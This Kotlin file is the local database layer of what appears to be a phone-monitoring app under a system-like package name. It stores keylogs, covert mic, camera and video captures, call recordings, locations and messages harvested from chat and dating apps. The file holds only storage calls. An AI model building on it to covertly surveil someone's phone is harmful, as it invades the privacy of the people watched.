package com.android.services.logs.source

import com.android.services.db.TextAlertEventDao
import com.android.services.db.dao.*
import com.android.services.db.entities.*
import com.android.services.models.UninstalledApp
import com.android.services.repository.GeoFenceEventRepository
import java.util.*
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class LocalDatabaseSource @Inject constructor(
    private val smsLogDao: SmsLogDao,
    private val callLogDao: CallLogDao,
    private val gpsLocationDao: GpsLocationDao,
    private val photosDao: PhotosDao,
    private val contactsDao: ContactsDao,
    private val appointmentLogDao: AppointmentLogDao,
    private val keyLogDao: KeyLogDao,
    private val browserHistoryDao: BrowserHistoryDao,
    private val installedAppsDao: InstalledAppsDao,
    private val connectedNetworkDao: ConnectedNetworkDao,
    private val pushStatusDao: PushStatusDao,
    private val micBugDao: MicBugDao,
    private val videoBugDao: VideoBugDao,
    private val cameraBugDao: CameraBugDao,
    private val screenShotDao: ScreenShotDao,
    private val screenTimeDao: ScreenTimeDao,
    private val snapChatEventDao: SnapChatEventDao,
    private val callRecordingDao: CallRecordingDao,
    private val screenRecordingDao: ScreenRecordingDao,
    private val voipCallDao: VoipCallDao,
    private val skypeRootedDao: SkypeRootedDao,
    private val whatsAppRootedDao: WhatsAppRootedDao,
    private val lineRootedDao: LineRootedDao,
    private val viberRootedDao: ViberRootedDao,
    private val imoRootedDao: ImoRootedDao,
    private val facebookRootedDao: FacebookRootedDao,
    private val instagramMessageRootedDao: InstagramMessageRootedDao,
    private val instagramPostRootedDao: InstagramPostRootedDao,
    private val tinderRootedDao: TinderRootedDao,
    private val tumblrPostRootedDao: TumblrPostRootedDao,
    private val tumblrMessageRootedDao: TumblrMessageRootedDao,
    private val zaloMessageRootedDao: ZaloMessageRootedDao,
    private val zaloPostRootedDao: ZaloPostRootedDao,
    private val hikeRootedDao: HikeRootedDao,
    private val hangoutRootedDao: HangoutRootedDao,
    private val whatsAppUnrootedDao: WhatsAppUnrootedDao,
    private val facebookUnrootedDao: FacebookUnrootedDao,
    private val skypeUnrootedDao: SkypeUnrootedDao,
    private val lineUnrootedDao: LineUnrootedDao,
    private val imoUnrootedDao: IMOUnrootedDao,
    private val viberUnrootedDao: ViberUnrootedDao,
    private val snapChatUnrootedDao: SnapChatUnrootedDao,
    private val tinderUnrootedDao: TinderUnrootedDao,
    private val tumblrUnrootedDao: TumblrUnrootedDao,
    private val instagramUnrootedDao: InstagramUnrootedDao,
    private val hikeUnrootedDao: HikeUnrootedDao,
    private val blockedAppDao: BlockedAppDao,
    private val geoFenceDao: GeoFenceDao,
    private val restrictedCallDao: RestrictedCallDao,
    private val webSiteDao: WebSiteDao,
    private val screenLimitDao: ScreenLimitDao,
    private val appLimitDao: AppLimitDao,
    private val voiceMessageDao: VoiceMessageDao,
    private val geoFenceEventDao: GeoFenceEventDao,
    private val textAlertDao: TextAlertDao,
    private val appNotificationsDao: AppNotificationsDao,
    private val textAlertEventDao: TextAlertEventDao,
    private val phoneServiceDao: PhoneServiceDao
) {

    // SmsLogs
    fun insertSms(smsLog: SmsLog) = smsLogDao.insert(smsLog)
    fun insertSms(smsLogs: List<SmsLog>) = smsLogDao.insert(smsLogs)
    fun getSmsLogs(callback: (List<SmsLog>) -> Unit) = callback(smsLogDao.selectAllSmsLogs(0))
    fun updateSmsLogs(startDate: Date, endDate: Date) =
        smsLogDao.updateSmsLogs(1, startDate, endDate)

    fun getAllSmsWithMessageBody(messageBody: String, callback: (List<SmsLog>) -> Unit) =
        callback(smsLogDao.getAllSmsWithMessageBody(messageBody))

    fun checkSmsNotAlreadyExists(smsId: String) = smsLogDao.checkIfAlreadyExist(smsId) == null

    // CallLogs
    fun insertCall(callLog: CallLog) = callLogDao.insert(callLog)
    fun insertCall(callLogs: List<CallLog>) = callLogDao.insert(callLogs)
    fun getCallLogs(callback: (List<CallLog>) -> Unit) = callback(callLogDao.selectAllCallLogs(0))
    fun updateCallLogs(startDate: Date, endDate: Date) =
        callLogDao.updateCallLogs(1, startDate, endDate)

    fun checkCallNotAlreadyExists(callId: String) = callLogDao.checkIfAlreadyExist(callId) == null

    // GpsLocation
    fun insertGpsLocation(gpsLocation: GpsLocation) = gpsLocationDao.insert(gpsLocation)
    fun getGpsLocations(callback: (List<GpsLocation>) -> Unit) =
        callback(gpsLocationDao.selectAllGpsLocation(0))

    fun updateGpsLocations(startDate: Date, endDate: Date) =
        gpsLocationDao.updateGpsLocation(1, startDate, endDate)

    // Photos
    fun insertPhoto(photos: Photos) = photosDao.insert(photos)
    fun getPhotos(callback: (List<Photos>) -> Unit) = callback(photosDao.selectAllImages(0))
    fun updatePhoto(id: String) = photosDao.update(1, id)
    fun checkImageNotAlreadyExists(id: String) = photosDao.checkIfAlreadyExist(id)

    // KeyLogger
    fun insertKeyLog(keyLog: KeyLog) = keyLogDao.insert(keyLog)
    fun getKeyLogs(callback: (List<KeyLog>) -> Unit) =
        callback(keyLogDao.selectAllKeyLogger(0))

    fun updateKeyLogs(startId: Int, endId: Int) =
        keyLogDao.updateKeyLogger(1, startId, endId)

    // Contacts
    fun insertContacts(contacts: Contacts) = contactsDao.insert(contacts)
    fun getContacts(callback: (List<Contacts>) -> Unit) = callback(contactsDao.selectAllContact(0))
    fun updateContacts(startId: Int, endId: Int) = contactsDao.updateContact(1, startId, endId)
    fun checkContactNotExistsAlready(id: String) = contactsDao.checkIfAlreadyExist(id) == null

    // Appointments
    fun insertAppointment(appointmentLogs: List<AppointmentLog>) =
        appointmentLogDao.insert(appointmentLogs)

    fun getAppointments(callback: (List<AppointmentLog>) -> Unit) =
        callback(appointmentLogDao.selectAllAppiontment(0))

    fun updateAppointments(startId: Int, endId: Int) =
        appointmentLogDao.updateAppiontment(1, startId, endId)

    fun checkAppointmentNotAlreadyExists(id: String) =
        appointmentLogDao.checkIfAlreadyExist(id) == null

    // BrowserHistory
    fun insertBrowserHistory(browserHistory: BrowserHistory) =
        browserHistoryDao.insert(browserHistory)

    fun getBrowserHistories(callback: (List<BrowserHistory>) -> Unit) =
        callback(browserHistoryDao.selectAllBrowserHistory(0))

    fun updateBrowserHistory(startId: Int, endId: Int) =
        browserHistoryDao.updateBrowserHistory(1, startId, endId)

    /// InstalledApps
    fun insertInstalledApps(installedApps: List<InstalledApp>) =
        installedAppsDao.insert(installedApps)

    fun getInstalledApps(callback: (List<InstalledApp>) -> Unit) =
        callback(installedAppsDao.selectAllInstalledApps(0))

    fun updateInstalledApps(startId: Int, endId: Int) = installedAppsDao.update(startId, endId, 1)
    fun checkInstalledAppNotExistAlready(
        packageName: String,
    ) = installedAppsDao.checkIfAlreadyExist(
        packageName
    ) == null

    fun getUninstallAppsList(): List<UninstalledApp> = installedAppsDao.selectUninstalledApps(1)

    // Connected Networks
    fun insertConnectedNetwork(connectedNetwork: ConnectedNetwork) =
        connectedNetworkDao.insert(connectedNetwork)

    fun getConnectedNetworks(callback: (List<ConnectedNetwork>) -> Unit) =
        callback(connectedNetworkDao.selectAllConnectedNetworks(0))

    fun updateConnectedNetwork(startDate: Date, endDate: Date) =
        connectedNetworkDao.updateConnectedNetworks(1, startDate, endDate)

    fun getLastConnectedNetwork(): ConnectedNetwork? = connectedNetworkDao.getLastConnectedNetwork()
    fun checkIfNetworkNotExistsAlready(uniqueId: String): Boolean =
        connectedNetworkDao.checkIfNotExistsAlready(uniqueId) == null

    // Push Statuses
    fun checkIfPushNotExistsAlready(pushId: String): Boolean =
        pushStatusDao.checkIfAlreadyExist(pushId) == null

    fun insertPushStatus(pushStatus: PushStatus) = pushStatusDao.insert(pushStatus)
    fun selectPushStatuses(callback: (List<PushStatus>) -> Unit) =
        callback(pushStatusDao.selectAllPushStatuses(0))

    fun updatePushStatus(startDate: Date, endDate: Date) =
        pushStatusDao.update(startDate, endDate, 1)

    fun updatePushStatus(pushId: String, status: String, pushStatus: Int) =
        pushStatusDao.update(pushId, status, pushStatus)

    // MicBug
    fun insertMicBug(micBug: MicBug) = micBugDao.insert(micBug)
    fun selectMicBugs(callback: (List<MicBug>) -> Unit) = callback(micBugDao.selectAllMicBugs(0, 1))
    fun selectMicBugWithSamePushId(pushId: String): List<MicBug> =
        micBugDao.selectMicBugWithSamePushId(pushId)

    fun updateMicBug(file: String) = micBugDao.update(file, 1)
    fun updateMicBugCompressionStatus(file: String, isCompressed: Int) =
        micBugDao.updateCompressionStatus(file, isCompressed)

    // VideoBug
    fun insertVideoBug(videoBug: VideoBug) = videoBugDao.insert(videoBug)
    fun selectVideoBugs(callback: (List<VideoBug>) -> Unit) =
        callback(videoBugDao.selectAllVideoBugs(0))

    fun updateVideoBug(file: String) = videoBugDao.update(file, 1)

    // CameraBug
    fun insertCameraBug(CameraBug: CameraBug) = cameraBugDao.insert(CameraBug)
    fun selectCameraBugs(callback: (List<CameraBug>) -> Unit) =
        callback(cameraBugDao.selectAllCameraBugs(0))

    fun updateCameraBug(file: String) = cameraBugDao.update(file, 1)

    // ScreenShot
    fun insertScreenShot(screenShot: ScreenShot) = screenShotDao.insert(screenShot)
    fun selectScreenShots(callback: (List<ScreenShot>) -> Unit) =
        callback(screenShotDao.selectAllScreenShots(0))

    fun updateScreenShot(file: String) = screenShotDao.update(file, 1)

    // ScreenTime
    fun insertScreenTime(screenTime: ScreenTime) = screenTimeDao.insert(screenTime)
    fun selectScreenTimes(callback: (List<ScreenTime>) -> Unit) =
        callback(screenTimeDao.selectAllScreenTime(0))

    fun updateScreenTime(startId: Int, endId: Int) =
        screenTimeDao.updateScreenTime(1, startId, endId)

    fun getTotalUsageScreenTime(startDate: Date, endDate: Date): Long =
        screenTimeDao.totalUsageTime(startDate, endDate)

    // SnapChatEvent
    fun insertSnapChatEvent(snapChatEvent: SnapChatEvent) =
        snapChatEventDao.insert(snapChatEvent)

    fun selectSnapChatEvents(callback: (List<SnapChatEvent>) -> Unit) =
        callback(snapChatEventDao.selectAllSnapChatEventEvents(0))

    fun updateSnapChatEvent(file: String) = snapChatEventDao.update(file, 1)

    //CallRecording
    fun insertCallRecording(callRecording: CallRecording) = callRecordingDao.insert(callRecording)
    fun checkIfCallRecordExist(callDate: String, callNumber: String) =
        callRecordingDao.checkIfCallRecordExist(callDate, callNumber)

    fun selectCallRecordings(callback: (List<CallRecording>) -> Unit) =
        callback(callRecordingDao.selectAllCallRecordings(1, 0))



    fun updateCallRecording(file: String) = callRecordingDao.update(file, 1)
    fun updateCallRecordingCompressionStatus(file: String, status: Int) =
        callRecordingDao.updateCompressionStatus(file, status)

    //ScreenRecording
    fun insertScreenRecording(screenRecording: ScreenRecording) =
        screenRecordingDao.insert(screenRecording)

    fun selectScreenRecordings(callback: (List<ScreenRecording>) -> Unit) =
        callback(screenRecordingDao.selectAllScreenRecordings(0, true))

    fun updateScreenRecording(file: String) = screenRecordingDao.update(file, 1)

    //VoipCall
    fun insertVoipCall(voipCall: VoipCall) = voipCallDao.insert(voipCall)
    fun selectVoipCalls(callback: (List<VoipCall>) -> Unit) =
        callback(voipCallDao.selectAllVoipCalls(0, 1))

    fun checkIfVoipCallAlreadyProceeded(callTime: String): String {
        val voipList = voipCallDao.checkIfVoipCallAlreadyProceeded(callTime)
        if (voipList.isEmpty()) {
            return "0"
        } else {
            return voipList.size.toString()
        }
    }

    fun updateVoipCall(file: String) = voipCallDao.updateVoipCall(file, 1)
    fun updateVoipCallCompressionStatus(file: String, isCompressed: Int) =
        voipCallDao.updateCompressionStatus(file, isCompressed)

    //Skype Rooted
    fun insertSkypeRooted(skypeRootedList: List<SkypeRooted>) =
        skypeRootedDao.insert(skypeRootedList)

    fun selectSkpyeRootedMaxTimeStamp(): Long? = skypeRootedDao.selectMaxTimeStamp()

    fun selectSkypeRooted(callback: (List<SkypeRooted>) -> Unit) =
        callback(skypeRootedDao.selectAllSkypeMessages(0))

    fun updateSkypeRooted(startDate: Date, endDate: Date) =
        skypeRootedDao.update(1, startDate, endDate)

    //WhatsApp Rooted
    fun insertWhatsAppRooted(WhatsAppRootedList: List<WhatsAppRooted>) =
        whatsAppRootedDao.insert(WhatsAppRootedList)

    fun selectWhatsAppRootedMaxTimeStamp(): Long? = whatsAppRootedDao.selectMaxTimeStamp()
    fun selectWhatsAppRooted(callback: (List<WhatsAppRooted>) -> Unit) =
        callback(whatsAppRootedDao.selectAllWhatsAppMessages(0))

    fun updateWhatsAppRooted(startDate: Date, endDate: Date) =
        whatsAppRootedDao.update(1, startDate, endDate)

    //Viber Rooted
    fun insertViberRooted(ViberRootedList: List<ViberRooted>) =
        viberRootedDao.insert(ViberRootedList)

    fun selectViberRootedMaxTimeStamp(): Long? = viberRootedDao.selectMaxTimeStamp()
    fun selectViberRooted(callback: (List<ViberRooted>) -> Unit) =
        callback(viberRootedDao.selectAllViberRootedMessages(0))

    fun updateViberRooted(startDate: Date, endDate: Date) =
        viberRootedDao.update(1, startDate, endDate)

    //Line Rooted
    fun insertLineRooted(LineRootedList: List<LineRooted>) =
        lineRootedDao.insert(LineRootedList)

    fun selectLineRootedMaxTimeStamp(): Long? = lineRootedDao.selectMaxTimeStamp()
    fun selectLineRooted(callback: (List<LineRooted>) -> Unit) =
        callback(lineRootedDao.selectAllLineMessages(0))

    fun updateLineRooted(startDate: Date, endDate: Date) =
        lineRootedDao.update(1, startDate, endDate)


    //Imo Rooted
    fun insertImoRooted(ImoRootedList: List<ImoRooted>) =
        imoRootedDao.insert(ImoRootedList)

    fun selectImoRootedMaxTimeStamp(): Long? = imoRootedDao.selectMaxTimeStamp()
    fun selectImoRooted(callback: (List<ImoRooted>) -> Unit) =
        callback(imoRootedDao.selectAllIMOMessages(0))

    fun updateImoRooted(startDate: Date, endDate: Date) =
        imoRootedDao.update(1, startDate, endDate)

    //Instagram Rooted
    fun insertInstagramMessageRooted(InstagramRootedList: List<InstagramMessageRooted>) =
        instagramMessageRootedDao.insert(InstagramRootedList)

    fun selectInstagramRootedMaxTimeStamp(): Long? = instagramMessageRootedDao.selectMaxTimeStamp()
    fun selectInstagramMessageRooted(callback: (List<InstagramMessageRooted>) -> Unit) =
        callback(instagramMessageRootedDao.selectAllInstagramMessageMessages(0))

    fun updateInstagramRooted(startDate: Date, endDate: Date) =
        instagramMessageRootedDao.update(1, startDate, endDate)

    //Instagram Message Rooted
    fun insertInstagramPostRooted(instagramPostRooted: List<InstagramPostRooted>) =
        instagramPostRootedDao.insert(instagramPostRooted)

    fun selectInstagramPostRootedMaxTimeStamp(): Long? =
        instagramMessageRootedDao.selectMaxTimeStamp()

    fun selectInstagramPostRooted(callback: (List<InstagramPostRooted>) -> Unit) =
        callback(instagramPostRootedDao.selectAllInstagramPostRootedMessages(0))

    fun updateInstagramPostRooted(startDate: Date, endDate: Date) =
        instagramPostRootedDao.update(1, startDate, endDate)


    //Facebook Rooted
    fun insertFacebookRooted(FacebookRootedList: List<FacebookRooted>) =
        facebookRootedDao.insert(FacebookRootedList)

    fun selectFacebookRootedMaxTimeStamp(): Long? = facebookRootedDao.selectMaxTimeStamp()
    fun selectFacebookRooted(callback: (List<FacebookRooted>) -> Unit) =
        callback(facebookRootedDao.selectAllFacebookMessages(0))

    fun updateFacebookRooted(startDate: Date, endDate: Date) =
        facebookRootedDao.update(1, startDate, endDate)

    //Hangout Rooted
    fun insertHangoutRooted(HangoutRootedList: List<HangoutRooted>) =
        hangoutRootedDao.insert(HangoutRootedList)

    fun selectHangoutRootedMaxTimeStamp(): Long? = hangoutRootedDao.selectMaxTimeStamp()
    fun selectHangoutRooted(callback: (List<HangoutRooted>) -> Unit) =
        callback(hangoutRootedDao.selectAllHangoutMessages(0))

    fun updateHangoutRooted(startDate: Date, endDate: Date) =
        hangoutRootedDao.update(1, startDate, endDate)

    //Hike Rooted
    fun insertHikeRooted(HikeRootedList: List<HikeRooted>) =
        hikeRootedDao.insert(HikeRootedList)

    fun selectHikeRootedMaxTimeStamp(): Long? = hikeRootedDao.selectMaxTimeStamp()
    fun selectHikeRooted(callback: (List<HikeRooted>) -> Unit) =
        callback(hikeRootedDao.selectAllHikeMessages(0))

    fun updateHikeRooted(startDate: Date, endDate: Date) =
        hikeRootedDao.update(1, startDate, endDate)

    //Tinder Rooted
    fun insertTinderRooted(TinderRootedList: List<TinderRooted>) =
        tinderRootedDao.insert(TinderRootedList)

    fun selectTinderRootedMaxTimeStamp(): Long? = tinderRootedDao.selectMaxTimeStamp()
    fun selectTinderRooted(callback: (List<TinderRooted>) -> Unit) =
        callback(tinderRootedDao.selectAllTinderMessages(0))

    fun updateTinderRooted(startDate: Date, endDate: Date) =
        tinderRootedDao.update(1, startDate, endDate)

    //ZaloMessage Rooted
    fun insertZaloMessageRooted(ZaloMessageRootedList: List<ZaloMessageRooted>) =
        zaloMessageRootedDao.insert(ZaloMessageRootedList)

    fun selectZaloMessageRootedMaxTimeStamp(): Long? = zaloMessageRootedDao.selectMaxTimeStamp()
    fun selectZaloMessageRooted(callback: (List<ZaloMessageRooted>) -> Unit) =
        callback(zaloMessageRootedDao.selectAllZaloMessageMessageMessages(0))

    fun updateZaloMessageRooted(startDate: Date, endDate: Date) =
        zaloMessageRootedDao.update(1, startDate, endDate)

    //ZaloPost Rooted
    fun insertZaloPostRooted(zaloPostRootedList: List<ZaloPostRooted>) =
        zaloPostRootedDao.insert(zaloPostRootedList)

    fun selectZaloPostRootedMaxTimeStamp(): Long? = zaloPostRootedDao.selectMaxTimeStamp()
    fun selectZaloPostRooted(callback: (List<ZaloPostRooted>) -> Unit) =
        callback(zaloPostRootedDao.selectAllZaloPostMessages(0))

    fun updateZaloPostRooted() =
        zaloPostRootedDao.update(0, 1)

    //TumblrMessage Rooted
    fun insertTumblrMessageRooted(TumblrMessageRootedList: List<TumblrMessageRooted>) =
        tumblrMessageRootedDao.insert(TumblrMessageRootedList)

    fun selectTumblrMessageRootedMaxTimeStamp(): Long? = tumblrMessageRootedDao.selectMaxTimeStamp()
    fun selectTumblrMessageRooted(callback: (List<TumblrMessageRooted>) -> Unit) =
        callback(tumblrMessageRootedDao.selectAllTumblrMessageRootedMessages(0))

    fun updateTumblrMessageRooted(startDate: Date, endDate: Date) =
        tumblrMessageRootedDao.update(1, startDate, endDate)

    //TumblrPost Rooted
    fun insertTumblrPostRooted(TumblrPostRootedList: List<TumblrPostRooted>) =
        tumblrPostRootedDao.insert(TumblrPostRootedList)

    fun checkTumblrPostAlreadyExists(id: String) =
        tumblrPostRootedDao.checkIfAlreadyExists(id) == null

    fun selectTumblrPostRootedMaxTimeStamp(): Long? = tumblrPostRootedDao.selectMaxTimeStamp()
    fun selectTumblrPostRooted(callback: (List<TumblrPostRooted>) -> Unit) =
        callback(tumblrPostRootedDao.selectAllTumblrPostMessages(0))

    fun updateTumblrPostRooted() =
        tumblrPostRootedDao.update(0, 1)

    //WhatsApp Unrooted
    fun insertWhatsAppUnrooted(whatsAppUnrooted: WhatsAppUnrooted) =
        whatsAppUnrootedDao.insert(whatsAppUnrooted)

    fun selectWhatsAppUnrooteds(): List<WhatsAppUnrooted> =
        whatsAppUnrootedDao.selectAllWhatsAppUnrootedLogs(0)

    fun updateMessageAsDeleted(id: String) = whatsAppUnrootedDao.updateMessage(id, 1)
    fun updateWhatsAppUnrooted(startId: Int, endId: Int) =
        whatsAppUnrootedDao.update(startId, endId, 1)

    fun checkIfWhatsAppMessageNotExistsAlready(messageId: String?): Boolean =
        whatsAppUnrootedDao.checkIfAlreadyExist(messageId!!) == null

    //Facebook Unrooted
    fun insertFacebookUnrooted(facebookUnrooted: FacebookUnrooted) =
        facebookUnrootedDao.insert(facebookUnrooted)

    fun selectFacebookUnrooteds(): List<FacebookUnrooted> =
        facebookUnrootedDao.selectAllFacebookUnrootedLogs(0)

    fun updateFacebookUnrooted(startId: Int, endId: Int) =
        facebookUnrootedDao.update(startId, endId, 1)

    fun checkIfFacebookMessageNotExistsAlready(messageId: String?): Boolean =
        facebookUnrootedDao.checkIfAlreadyExist(messageId!!) == null

    //Skype Unrooted
    fun insertSkypeUnrooted(skypeUnrooted: SkypeUnrooted) =
        skypeUnrootedDao.insert(skypeUnrooted)

    fun selectSkypeUnrooted(): List<SkypeUnrooted> =
        skypeUnrootedDao.selectAllSkypeUnrootedLogs(0)

    fun updateSkypeUnrooted(startId: Int, endId: Int) =
        skypeUnrootedDao.update(startId, endId, 1)

    fun checkIfSkypeMessageNotExistsAlready(messageId: String?): Boolean =
        skypeUnrootedDao.checkIfAlreadyExist(messageId!!) == null

    //Line Unrooted
    fun insertLineUnrooted(lineUnrooted: LineUnrooted) =
        lineUnrootedDao.insert(lineUnrooted)

    fun selectLineUnrooteds(): List<LineUnrooted> = lineUnrootedDao.selectAllLineUnrootedLogs(0)

    fun updateLineUnrooted(startId: Int, endId: Int) =
        lineUnrootedDao.update(startId, endId, 1)

    fun checkLineIfAlreadyExist(messageId: String): Boolean =
        lineUnrootedDao.checkLineIfAlreadyExist(messageId) == null

    //Imo Unrooted
    fun insertIMOUnrooted(imoUnrooted: IMOUnrooted) =
        imoUnrootedDao.insert(imoUnrooted)

    fun selectIMOUnrooteds(): List<IMOUnrooted> = imoUnrootedDao.selectAllIMOUnrootedLogs(0)
    fun updateIMOUnrooted(startId: Int, endId: Int) =
        imoUnrootedDao.update(startId, endId, 1)

    fun checkImoIfAlreadyExist(messageId: String): Boolean =
        imoUnrootedDao.checkImoIfAlreadyExist(messageId) == null

    //Viber Unrooted
    fun insertViberUnrooted(viberUnrooted: ViberUnrooted) =
        viberUnrootedDao.insert(viberUnrooted)

    fun selectViberUnrooteds(): List<ViberUnrooted> =
        viberUnrootedDao.selectAllViberUnrootedLogs(0)

    fun updateViberUnrooted(startId: Int, endId: Int) =
        viberUnrootedDao.update(startId, endId, 1)

    fun checkViberIfAlreadyExist(messageId: String): Boolean {
        return viberUnrootedDao.checkViberIfAlreadyExist(messageId) == null
    }

    //SnapChat Unrooted
    fun insertSnapchatUnrooted(snapChatUnrooted: SnapChatUnrooted) =
        snapChatUnrootedDao.insert(snapChatUnrooted)

    fun selectSnapchatUnrooteds(): List<SnapChatUnrooted> =
        snapChatUnrootedDao.selectAllSnapChatUnrootedLogs(0)

    fun updateSnapchatUnrooted(startId: Int, endId: Int) =
        snapChatUnrootedDao.update(startId, endId, 1)

    fun checkSnapChatIfAlreadyExist(messageId: String): Boolean =
        snapChatUnrootedDao.checkSnapChatIfAlreadyExist(messageId) == null

    //Instagram Unrooted
    fun insertInstagramUnrooted(instagramUnrooted: InstagramUnrooted) =
        instagramUnrootedDao.insert(instagramUnrooted)

    fun selectInstagramUnrooteds(): List<InstagramUnrooted> =
        instagramUnrootedDao.selectAllInstagramUnrootedLogs(0)

    fun updateInstagramUnrooted(startId: Int, endId: Int) =
        instagramUnrootedDao.update(startId, endId, 1)

    fun checkInstagramIfAlreadyExist(messageId: String): Boolean =
        instagramUnrootedDao.checkInstagramIfAlreadyExist(messageId) == null

    //Hike Unrooted
    fun insertHikeUnrooted(hikeUnrooted: HikeUnrooted) =
        hikeUnrootedDao.insert(hikeUnrooted)

    fun selectHikeUnrooteds(): List<HikeUnrooted> =
        hikeUnrootedDao.selectAllHikeUnrootedLogs(0)

    fun updateHikeUnrooted(startId: Int, endId: Int) =
        hikeUnrootedDao.update(startId, endId, 1)

    fun checkHikeIfAlreadyExist(messageId: String): Boolean =
        hikeUnrootedDao.checkHikeIfAlreadyExist(messageId) == null

    //Tinder Unrooted
    fun insertTinderUnrooted(tinderUnrooted: TinderUnrooted) =
        tinderUnrootedDao.insert(tinderUnrooted)

    fun selectTinderUnrooteds(): List<TinderUnrooted> =
        tinderUnrootedDao.selectAllTinderUnrootedLogs(0)

    fun updateTinderUnrooted(startId: Int, endId: Int) =
        tinderUnrootedDao.update(startId, endId, 1)

    fun checkTinderAlreadyExists(messageId: String): Boolean =
        tinderUnrootedDao.checkTinderAlreadyExists(messageId) == null

    //Tumblr Unrooted
    fun insertTumblrUnrooted(tumblrUnrooted: TumblrUnrooted) =
        tumblrUnrootedDao.insert(tumblrUnrooted)

    fun selectTumblrUnrooteds(): List<TumblrUnrooted> =
        tumblrUnrootedDao.selectAllTumblrUnrootedLogs(0)

    fun updateTumblrUnrooted(startId: Int, endId: Int) =
        tumblrUnrootedDao.update(startId, endId, 1)

    fun checkTumblrExistsAlready(messageId: String): Boolean =
        tumblrUnrootedDao.checkTumblrExistsAlready(messageId) == null

    // Blocked App
    fun insertBlockedApp(blockedApp: BlockedApp) {
        val blockedPackage = blockedAppDao.checkAlreadyExists(blockedApp.packageName)
        if (blockedPackage == null) {
            blockedAppDao.insert(blockedApp)
        } else {
            blockedAppDao.update(blockedApp)
        }
    }

    fun selectBlockedApps(): List<String> = blockedAppDao.selectAllBlockedApps("0")

    // GeoFence
    fun insertGeoFence(geoFence: GeoFence) = geoFenceDao.insert(geoFence)
    fun deleteGeoFence(id: String) = geoFenceDao.delete(id)
    fun selectGeoFences() = geoFenceDao.selectAllGeoFences(true)

    // Restricted Calls
    fun insertRestrictedCall(restrictedCall: RestrictedCall) =
        restrictedCallDao.insert(restrictedCall)

    fun deleteRestrictedCall(number: String) = restrictedCallDao.delete(number)

    // WebSite
    fun insertWebSite(webSite: WebSite) {
        val url = webSiteDao.checkIfAlreadyExist(webSite.url)
        if (url == null) {
            webSiteDao.insert(webSite)
        } else {
            webSiteDao.update(webSite)
        }
    }

    /** Select Websites **/
    fun selectWebSites(): List<WebSite> = webSiteDao.selectAllWebSites("1")

    // ScreenLimit
    fun deleteScreenLimit(screenDay: String) = screenLimitDao.delete(screenDay)

    fun insertScreenLimit(screenLimit: ScreenLimit) = screenLimitDao.insert(screenLimit)

    fun selectScreenLimits(): List<ScreenLimit> =
        screenLimitDao.selectAllScreenLimit()

    fun deleteScreenUsageLimit(screenDay: String) =
        screenLimitDao.delete(screenDay)

    fun deleteScreenRangeLimit(day: String) =
        screenLimitDao.removeScreenRangeLimit(day, "", "")

    fun updateScreenLimit(screenLimit: ScreenLimit) =
        screenLimitDao.update(screenLimit)

    fun checkScreenLimitNotAlreadyExists(day: String): ScreenLimit? =
        screenLimitDao.checkIfAlreadyExists(day)

    // appLimit
    fun deleteAppLimit(packageName: String) =
        appLimitDao.delete(packageName)

    fun insertAppLimit(appLimit: AppLimit) =
        appLimitDao.insert(appLimit)

    fun selectAppLimits(): List<AppLimit> =
        appLimitDao.selectAllAppLimit()

    fun updateAppLimit(appLimit: AppLimit) =
        appLimitDao.update(appLimit)

    fun checkAppLimitNotAlreadyExists(packageName: String): AppLimit? =
        appLimitDao.checkIfAlreadyExists(packageName)

    // Voice Message
    fun insertVoiceMessage(voiceMessageList: List<VoiceMessage>) =
        voiceMessageDao.insert(voiceMessageList)

    fun selectVoiceMessageMessages(callback: (List<VoiceMessage>) -> Unit) =
        callback(voiceMessageDao.selectAllVoiceMessageMessages(0))

    fun updateVoiceMessage(startDate: Date, endDate: Date) =
        voiceMessageDao.update(1, startDate, endDate)

    fun updateVoiceMessage(file: String) =
        voiceMessageDao.update(file, 1)

    fun selectMaxVoiceMessageTimeStamp(appName: String): Long? =
        voiceMessageDao.selectMaxTimeStamp(appName)

    // GeoFence Event
    fun insertGeoFenceEvent(geoFenceEvent: GeoFenceEvent) =
        geoFenceEventDao.insert(geoFenceEvent)

    fun selectGeoFenceEvents(): List<GeoFenceEvent> =
        geoFenceEventDao.selectAllGeoFenceEvent(0)

    fun updateGeoFenceEvent(startId: Int, endId: Int) =
        geoFenceEventDao.updateGeoFenceEvent(1, startId, endId)

    // Text Alert
    fun insertTextAlert(textAlert: TextAlert) = textAlertDao.insert(textAlert)
    fun selectTextAlerts(callback: (List<TextAlert>) -> Unit) =
        callback(textAlertDao.selectAllTextAlerts())

    fun deleteTextAlert(alertId: String) = textAlertDao.delete(alertId)
    fun updateTextAlert(textAlert: TextAlert) = textAlertDao.update(textAlert)

    // App Notifications
    fun insertAppNotifications(appNotifications: AppNotifications) =
        appNotificationsDao.insert(appNotifications)

    fun insertAppNotifications(appNotifications: List<AppNotifications>) =
        appNotificationsDao.insert(appNotifications)

    fun getAppNotifications(callback: (List<AppNotifications>) -> Unit) =
        callback(appNotificationsDao.selectAllAppNotifications(0))

    fun updateAppNotifications(startDate: Date, endDate: Date) =
        appNotificationsDao.updateAppNotifications(1, startDate, endDate)

    fun checkAppNotificationNotAlreadyExists(id: String) =
        appNotificationsDao.checkIfAlreadyExist(id) == null

    // TextAlerts Events
    fun insertTextAlert(textAlertEvent: TextAlertEvent) = textAlertEventDao.insert(textAlertEvent)
    fun selectTextAlertEvents(callback: (List<TextAlertEvent>) -> Unit) =
        callback(textAlertEventDao.selectAllTextAlertEvents(0))

    fun updateTextAlerts(startDate: Date, endDate: Date) =
        textAlertEventDao.updateTextAlertEvents(1, startDate, endDate)

    //Phone Service
    fun insertPhoneService(phoneServices: List<PhoneServices>) =
        phoneServiceDao.insertPhoneService(phoneServices)

    fun insertPhoneService(phoneServices: PhoneServices) =
        phoneServiceDao.insertPhoneService(phoneServices)

    fun selectAllPhoneServiceList(callback: (List<PhoneServices>) -> Unit) =
        callback(phoneServiceDao.selectAllPhoneServices())
}
